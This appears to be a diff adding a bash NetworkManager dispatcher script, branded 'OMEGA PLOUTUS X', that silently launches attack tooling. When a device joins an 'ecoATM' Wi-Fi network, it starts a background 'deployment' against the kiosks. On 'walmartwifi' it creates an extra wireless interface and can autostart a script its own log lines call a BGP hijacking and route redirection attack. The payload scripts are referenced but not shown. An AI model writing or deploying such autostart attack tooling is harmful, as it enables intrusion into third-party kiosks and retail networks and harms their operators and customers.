@@ -1,0 +1,169 @@
+#!/bin/bash
+# OMEGA PLOUTUS X - NetworkManager Dispatcher Script
+# Automatically triggers ecoATM deployment when ecoATM WiFi is detected
+# Install to: /etc/NetworkManager/dispatcher.d/omega_ecosystem
+
+INTERFACE="$1"
+ACTION="$2"
+
+# ecoATM WiFi SSID to monitor
+ECOATM_SSID="ecoATM"
+
+# OMEGA installation directory
+OMEGA_DIR="/opt/omega"
+OMEGA_CONFIG="${OMEGA_DIR}/network_config.sh"
+OMEGA_DEPLOY="${OMEGA_DIR}/auto_ecoATM_deploy.sh"
+
+# Log function
+log() {
+    logger -t "omega-dispatcher" "$*"
+    echo "$(date '+%Y-%m-%d %H:%M:%S') - $*" >> /var/log/omega_dispatcher.log
+}
+
+log "NetworkManager dispatcher triggered: $INTERFACE $ACTION"
+
+# Only process WiFi interfaces
+if [[ "$INTERFACE" != wlan* ]]; then
+    exit 0
+fi
+
+# Load network configuration
+if [[ -f "$OMEGA_CONFIG" ]]; then
+    source "$OMEGA_CONFIG"
+else
+    log "ERROR: OMEGA network config not found: $OMEGA_CONFIG"
+    exit 1
+fi
+
+# Check if ecoATM WiFi is connected
+is_ecosystem_connected() {
+    # Check if any interface is connected to ecoATM
+    nmcli device status | grep -q "ecoATM"
+}
+
+# Main logic
+case "$ACTION" in
+    "up")
+        log "Interface $INTERFACE came up"
+
+        # Small delay to let connection stabilize
+        sleep 3
+
+        # Check if ecoATM WiFi is now available
+        if is_ecosystem_connected; then
+            log "🎯 ecoATM WiFi detected on interface $INTERFACE!"
+
+            # Check if OMEGA deployment is already running
+            if pgrep -f "auto_ecoATM_deploy.sh" > /dev/null; then
+                log "OMEGA deployment already running"
+                exit 0
+            fi
+
+            # Verify deployment script exists
+            if [[ ! -x "$OMEGA_DEPLOY" ]]; then
+                log "ERROR: OMEGA deployment script not found or not executable: $OMEGA_DEPLOY"
+                exit 1
+            fi
+
+            log "🚀 Launching OMEGA PLOUTUS X ecoATM deployment..."
+
+            # Launch deployment in background
+            nohup "$OMEGA_DEPLOY" >> /var/log/omega_deployment.log 2>&1 &
+            DEPLOY_PID=$!
+
+            log "OMEGA deployment started (PID: $DEPLOY_PID)"
+
+            # Monitor deployment for a few seconds
+            sleep 5
+            if kill -0 $DEPLOY_PID 2>/dev/null; then
+                log "✅ OMEGA deployment running successfully"
+            else
+                log "❌ OMEGA deployment failed to start"
+            fi
+
+        # Check for Walmart WiFi (for BGP hijacking autostart and interface preparation)
+        elif nmcli device status | grep "$INTERFACE" | grep -q "walmartwifi"; then
+            log "🏪 Walmart WiFi detected on interface $INTERFACE - preparing for ecoATM operations"
+
+            # Pre-create wlan1 interface for ecoATM operations
+            if [[ "$INTERFACE" == "wlan0" ]]; then
+                log "🔧 Pre-creating wlan1 interface for ecoATM operations"
+
+                # Check if wlan1 already exists
+                if ! iw dev | grep -q "wlan1"; then
+                    # Bring down wlan0 temporarily
+                    ip link set wlan0 down || log "WARNING: Failed to bring down wlan0"
+
+                    # Create wlan1 interface
+                    iw dev wlan0 interface add wlan1 type managed || log "WARNING: Failed to create wlan1 interface"
+
+                    # Bring wlan1 up
+                    ip link set wlan1 up || log "WARNING: Failed to bring up wlan1"
+
+                    # Bring wlan0 back up
+                    ip link set wlan0 up || log "WARNING: Failed to bring wlan0 back up"
+
+                    log "✅ wlan1 interface created successfully"
+                else
+                    log "wlan1 interface already exists"
+                fi
+            fi
+
+            # Check if BGP hijacking should be enabled (environment variable or config file)
+            if [[ "${OMEGA_BGP_AUTO:-false}" == "true" ]] || [[ -f "${OMEGA_DIR}/bgp_autostart.enabled" ]]; then
+                log "🌐 BGP Hijacking autostart enabled - launching route redirection attack"
+
+                # Check if BGP attack is already running
+                if pgrep -f "route_redirection_attack.py" > /dev/null; then
+                    log "BGP hijacking already running"
+                else
+                    # Launch BGP hijacking in background
+                    BGP_SCRIPT="${OMEGA_DIR}/route_redirection_attack.py"
+                    if [[ -x "$BGP_SCRIPT" ]]; then
+                        log "🚀 Launching BGP hijacking attack..."
+                        nohup python3 "$BGP_SCRIPT" --type simulation --rogue >> /var/log/omega_bgp.log 2>&1 &
+                        BGP_PID=$!
+                        log "BGP hijacking started (PID: $BGP_PID)"
+                    else
+                        log "WARNING: BGP script not found: $BGP_SCRIPT"
+                    fi
+                fi
+            else
+                log "BGP hijacking autostart disabled"
+            fi
+
+        else
+            log "No ecoATM WiFi detected on $INTERFACE"
+        fi
+        ;;
+
+    "down")
+        log "Interface $INTERFACE went down"
+
+        # Could add cleanup logic here if needed
+        # For now, let the main deployment script handle cleanup
+        ;;
+
+    "connectivity-change")
+        log "Connectivity change on $INTERFACE"
+
+        # Check connectivity state
+        CONNECTIVITY=$(nmcli networking connectivity)
+        log "Network connectivity: $CONNECTIVITY"
+
+        if [[ "$CONNECTIVITY" == "full" ]]; then
+            # Full connectivity - check for ecoATM
+            if is_ecosystem_connected; then
+                log "Full connectivity with ecoATM WiFi detected"
+                # Trigger could be added here if needed
+            fi
+        fi
+        ;;
+
+    *)
+        # Other actions (dhcp4-change, dhcp6-change, etc.)
+        log "Unhandled action: $ACTION on $INTERFACE"
+        ;;
+esac
+
+exit 0
